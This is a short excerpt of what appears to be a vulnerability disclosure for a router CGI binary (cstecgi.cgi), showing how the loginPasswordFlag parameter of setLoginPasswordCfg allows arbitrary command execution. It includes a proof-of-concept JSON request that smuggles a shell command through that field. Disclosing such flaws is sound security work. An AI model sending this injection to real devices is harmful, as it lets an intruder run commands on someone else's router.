...
The vulnerability is located in the function `sub_4109AC` within `cstecgi.cgi`, also known as `setLoginPasswordCfg`.

![](Pasted%20image%2020231130005750.png)
...
therefore , by controlling parameter among `admpass,loginPasswordFlag` , we can finally make an arbitrary command execution
...
{"loginPasswordFlag":"`id > /1.txt;`","topicurl":"setLoginPasswordCfg","token":"00000000000000000000000000000000"}
~~~

(tips:if you use qemu emulation ur likely to patch a few places to work normally)
### Impact:

![](Pasted%20image%2020231130005936.png)